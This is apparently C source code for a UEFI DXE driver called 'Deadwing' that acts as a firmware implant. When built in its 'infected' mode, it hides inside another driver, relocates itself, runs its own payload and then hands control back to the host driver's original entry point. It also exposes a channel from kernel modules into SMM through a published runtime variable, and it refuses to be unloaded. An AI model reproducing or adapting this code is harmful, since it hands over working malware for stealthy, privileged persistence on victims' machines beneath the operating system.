#include <Uefi.h>
#include <Base.h>

#include <Library/UefiLib.h>

#include <Protocol/LoadedImage.h>
#include <Protocol/MmCommunication2.h>

#include <Guid/EventGroup.h>

#include "Conf.h"

#ifndef DEADWING_QEMU_FIRMWARE
#include "VisualUefi.h"
#endif

#include "Defs.h"
#include "Globals.h"
#include "Utils.h"
#include "Serial.h"
#include "Relocations.h"

#define EFI_OBLIGATORY_PTR 0x0 

#define CMD_DEADWING_PING_SMI 0xD700DEADULL

#define DEADWING_COMMUNICATE_HEADER_SIZE (OFFSET_OF(EFI_MM_COMMUNICATE_HEADER, Data))

typedef EFI_STATUS(EFIAPI *__EfiEntry)(IN EFI_HANDLE, IN EFI_SYSTEM_TABLE *);
__EfiEntry Entry;


/**
 * \brief Setups communication buffer for convoying into the SMM environment.
 * 
 * This API is exposed for use by kernel module(s)
 * 
 * \param CommunicationPacket Communication packet with data which will be convoyed
 * \param DataSize            Size of packet
 * 
 * \return EFI_SUCCESS - Buffer succesfully setuped 
 * \return EFI_INVALID_PARAMETER - Packet size overlaps communication buffer
 */
EFI_STATUS
EFIAPI
SetupCommunicationBuffer(
	IN PDEADWING_COMMUNICATION CommunicationPacket,
	IN UINTN                   DataSize
) {
	if(DataSize > gCommSize)
		return EFI_INVALID_PARAMETER;
	
	EFI_MM_COMMUNICATE_HEADER *CommHeader = (EFI_MM_COMMUNICATE_HEADER *)gCommBuf;

	// fill header
	CopyMemory(&CommHeader->HeaderGuid, &gDeadwingSmiHandlerGuid, sizeof(EFI_GUID));
	CopyMemory(&CommHeader->Data, CommunicationPacket, sizeof(DEADWING_COMMUNICATION));
	CommHeader->MessageLength = gCommSize;

	return EFI_SUCCESS;
}

/**
 * \brief Main function for communication.
 * 
 * This API is exposed for use by kernel module(s)
 * 
 * \returns NULL if Communicate service fails or CommPacket with
 * info from SMM environment
 */
PDEADWING_COMMUNICATION
EFIAPI
DeadwingSmmCommunicate(
	VOID
) {
	// convey data to child SMI handler
	UINTN CommSize = gCommSize;
	EFI_STATUS Status = gMmCommunicate2->Communicate(gMmCommunicate2, gPhysCommBuf, gCommBuf, &CommSize);
	if(EFI_ERROR(Status))
		return NULL;
	
	EFI_MM_COMMUNICATE_HEADER *CommHeader = (EFI_MM_COMMUNICATE_HEADER *)gCommBuf;
	PDEADWING_COMMUNICATION CommPacket = (PDEADWING_COMMUNICATION)CommHeader->Data;

	return CommPacket;
}

/**
 * \brief Sample function for firing SMI's
 * 
 * \param Command Command magic number
 * 
 * \return EFI_SUCCESS - SMI handler responded succesfully
 * \return EFI_ABORTED - Unable to communicate with handler and cache packet
 * \return Other - SMI handler cannot process current operation
 */
EFI_STATUS
EFIAPI
FireSmi(
	IN UINT64                 Command
) {
	DEADWING_COMMUNICATION CommPacket;
	CommPacket.Command = Command;
	CommPacket.SmiRetStatus = EFI_COMPROMISED_DATA;

	SetupCommunicationBuffer(&CommPacket, sizeof(CommPacket));

	PDEADWING_COMMUNICATION OutputPacket = DeadwingSmmCommunicate();
	if(OutputPacket == NULL)
		return EFI_ABORTED;

	gBS->SetMem(gCommBuf, gCommSize, 0);

	return OutputPacket->SmiRetStatus;
}

/**
 * \brief Converts a pointer to a buffer for communication 
 * for further use by OS kernel driver(s)
 * 
 * \param Event   Event whose notification function is being invoked
 * \param Context The pointer to the notification function's context
 */
VOID
EFIAPI
DeadwingDxeGoneVirtual(
	IN EFI_EVENT  Event,
	IN VOID      *Context
) {
	SerialPrint("[ DXE ] Hit virtual address change callback\r\n");

	VOID *VirtualBuf = gPhysCommBuf;
	VOID *SetupCommBufFunc = SetupCommunicationBuffer;
	VOID *DeadwingSmmCommFunc = DeadwingSmmCommunicate;

	// convert necessary stuff
	gRT->ConvertPointer(EFI_OBLIGATORY_PTR, (VOID **)&gMmCommunicate2);
	gRT->ConvertPointer(EFI_OBLIGATORY_PTR, (VOID **)&VirtualBuf);
	gRT->ConvertPointer(EFI_OBLIGATORY_PTR, (VOID **)&SetupCommBufFunc);
	gRT->ConvertPointer(EFI_OBLIGATORY_PTR, (VOID **)&DeadwingSmmCommFunc);

	gCommBuf = VirtualBuf;

	// fill transfer packet
	DEADWING_TRANSFER Transfer = { 0 };
	Transfer.Buffer.CommBufPhys = gPhysCommBuf;
	Transfer.Buffer.CommBufVirtual = gCommBuf;
	Transfer.Buffer.BufSize = gCommSize;
	Transfer.API.SetupBufFunction = SetupCommBufFunc;
	Transfer.API.SmmCommunicateFunction = DeadwingSmmCommFunc;

	// finally, publish full transfer packet
	EFI_STATUS Status = gRT->SetVariable(L"DeadwingTransfer", &gDeadwingTransferVarGuid, (EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS), sizeof(DEADWING_TRANSFER), &Transfer);
	if(EFI_ERROR(Status))
		SerialPrint("[ DXE ] Unable to publish transfer packet. This is normally fatal\r\n");

	SerialPrint("[ DXE ] Transfering to RT phase\r\n");

	gGoneVirtual = NULL;
}

/**
 * \brief An ExitBootServices callback which fires test SMI
 * 
 * \param Event   Event whose notification function is being invoked
 * \param Context The pointer to the notification function's context
 */
VOID
EFIAPI
DeadwingBeforeExitBootServices(
	IN EFI_EVENT  Event,
	IN VOID      *Context
) {
	SerialPrint("[ DXE ] Checking if SMI handler presents\r\n");

	// fire test SMI
	EFI_STATUS Status = FireSmi(CMD_DEADWING_PING_SMI);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ DXE ] Unable to ping SMI handler\r\n");
		gBS->CloseEvent(gGoneVirtual);
	}

	gBS->CloseEvent(gExitBs);
}

/**
 * \brief A callback for EFI_MM_COMMUNICATION2_PROTOCOL registration and caching
 * 
 * \param Event   Event whose notification function is being invoked
 * \param Context The pointer to the notification function's context
 */
VOID
EFIAPI
MmCommProtocolRegistrationCallback(
	IN EFI_EVENT  Event,
	IN VOID      *Context
) {
	SerialPrint("[ DXE ] Hit registration callback\r\n");

	// locate EFI_MM_COMMUNICATION2_PROTOCOL protocol.. again..
	EFI_STATUS Status = gBS->LocateProtocol(&gEfiMmCommunication2ProtocolGuid, NULL, (VOID **)&gMmCommunicate2);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ DXE ] Unable to locate EFI_MM_COMMUNICATION2_PROTOCOL protocol\r\n");
		
		gBS->CloseEvent(gGoneVirtual);
		gBS->FreePool(gCommBuf);
	} else {
		SerialPrint("[ DXE ] EFI_MM_COMMUNICATION2_PROTOCOL protocol discovered\r\n");
	}

	gBS->CloseEvent(gRegNotify);
}

/**
 * \brief The main function of the DXE driver. Allocates a buffer for 
 * communication and registers an event for subsequent pointer conversion
 * 
 * \param ImageHandle Image handle
 * \param SystemTable Pointer on EFI_SYSTEM_TABLE table
 * 
 * \return EFI_SUCCESS - Buffer allocated, event registered
 * \return Other - Unable to allocate buffer or register an event
 */
EFI_STATUS
EFIAPI
DeadwingDxeMain(
	IN EFI_HANDLE        ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
) {
	SerialPrint("=[ Deadwing DXE ]=\r\n");

	// calculate comm buffer size
	gCommSize = sizeof(DEADWING_COMMUNICATION) + DEADWING_COMMUNICATE_HEADER_SIZE;

	/// \note @0x00Alchemist: Technically, all allocated memory in the SMM context remains in SMRAM. 
	/// Therefore, the communication buffer is allocated in the DXE driver. This buffer must later be 
	/// visible to the SMM context
	EFI_STATUS Status = gBS->AllocatePool(EfiRuntimeServicesData, gCommSize, &gPhysCommBuf);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ DXE ] Unable to allocate communication buffer\r\n");
		return Status;
	}

	gBS->SetMem(gPhysCommBuf, gCommSize, 0);
	gCommBuf = gPhysCommBuf;

	// locate and cache EFI_MM_COMMUNICATION2_PROTOCOL protocol
	VOID *Registration;
	BOOLEAN IsAwaitingForRegistartion = FALSE;
	Status = gBS->LocateProtocol(&gEfiMmCommunication2ProtocolGuid, NULL, (VOID **)&gMmCommunicate2);
	if(EFI_ERROR(Status)) {
		/// \note @0x00Alchemist: The DXE driver can be started by the DXE Dispatcher before the SMM Core is initialized. 
		/// If the EFI_MM_COMM_COMMUNICATION2_PROTOCOL protocol was not found earlier (i.e., the driver started before SMM Core) 
		/// we need to wait a while before trying to find the communication protocol again
		
		SerialPrint("[ DXE ] EFI_MM_COMMUNICATION2_PROTOCOL protocol not registered yet, waiting for registration..\r\n");
		
		// register event
		Status = gBS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, MmCommProtocolRegistrationCallback, NULL, &gRegNotify);
		if(EFI_ERROR(Status)) {
			SerialPrint("[ DXE ] Unable to register MmCommProtocolRegistrationCallback callback\r\n");
			gBS->FreePool(gCommBuf);
			return Status;
		}

		// register notifier
		Status = gBS->RegisterProtocolNotify(&gEfiMmCommunication2ProtocolGuid, gRegNotify, &Registration);
		if(EFI_ERROR(Status)) {
			SerialPrint("[ DXE ] Unable to register MmCommProtocolRegistrationCallback notifier\r\n");
			
			gBS->CloseEvent(gRegNotify);
			gBS->FreePool(gCommBuf);

			return Status;
		}

		// set flag
		IsAwaitingForRegistartion = TRUE;
	}

	// create an exitbootservices callback for pinging our SMI handler at the end of the boot stage
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, DeadwingBeforeExitBootServices, NULL, &gEfiEventBeforeExitBootServicesGuid, &gExitBs);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ DXE ] Cannot create ExitBootServices callback\r\n");

		gBS->FreePool(gCommBuf);

		if(IsAwaitingForRegistartion)
			gBS->CloseEvent(gRegNotify);

		return Status;
	}

	// register virtual address change event
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, DeadwingDxeGoneVirtual, NULL, &gEfiEventVirtualAddressChangeGuid, &gGoneVirtual);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ DXE ] Cannot create virtual address change callback\r\n");

		gBS->FreePool(gCommBuf);
		gBS->CloseEvent(gExitBs);

		if(IsAwaitingForRegistartion)
			gBS->CloseEvent(gRegNotify);
	}

	return Status;
}

/**
 * \brief Unload routine
 * 
 * \param ImageHandle Image handle
 * 
 * \return EFI_ACCESS_DENIED - because we can't
 */
EFI_STATUS
EFIAPI
UefiUnload(
	IN EFI_HANDLE ImageHandle
) {
	return EFI_ACCESS_DENIED;
}

/**
 * \brief Entry point of DXE driver.
 * 
 * This function relocates the driver to a different base address (if necessary).
 * Verbose output not expected.
 * 
 * \param ImageHandle Image handle
 * \param SystemTable Pointer on EFI_SYSTEM_TABLE table
 * 
 * \return EFI_SUCCESS - Driver was initialized
 * \return Other - An error occurred during driver initialization
 */
EFI_STATUS
EFIAPI
UefiMain(
	IN EFI_HANDLE        ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
) {
	EFI_STATUS Status;

	gST = SystemTable;
	gBS = SystemTable->BootServices;
	gRT = SystemTable->RuntimeServices;

#ifdef DEADWING_INFECTED
	Status = EFI_ABORTED;

	// get address of Deadwing DXE payload
	VOID *DeadwingDxeBase = FindBaseAddress(&UefiMain);
	if(DeadwingDxeBase != NULL) {
		// fix relocs
		if(!RelProcessRelocTable(DeadwingDxeBase, DeadwingDxeBase))
			return EFI_ABORTED;

		// relocate image and call DeadwingDxeMain routine
		VOID *NewDeadwingDxeBase = RelProcessSelfReloc(DeadwingDxeBase);
		if(NewDeadwingDxeBase == NULL)
			return EFI_ABORTED;

		Entry = (__EfiEntry)((UINT8 *)NewDeadwingDxeBase + ((UINT8 *)DeadwingDxeMain - (UINT8 *)NewDeadwingDxeBase));
		Entry(ImageHandle, SystemTable);

		// get information about current image
		EFI_LOADED_IMAGE *Loaded;
		Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&Loaded);
		if(EFI_ERROR(Status))
			return Status;
		
		// get current headers. Entry point of the infected driver stored here
		EFI_IMAGE_NT_HEADERS64 *Nt64 = GetNtHeaders(NewDeadwingDxeBase);
		if(Nt64 == NULL)
			return EFI_ABORTED;

		// get and call original EP
		Entry = (__EfiEntry)((UINT8 *)Loaded->ImageBase + Nt64->OptionalHeader.AddressOfEntryPoint);
		Status = Entry(ImageHandle, SystemTable);
	}
#else
	// just call Deadwing DXE driver main routine
	Status = DeadwingDxeMain(ImageHandle, SystemTable);
#endif

	return Status;
}
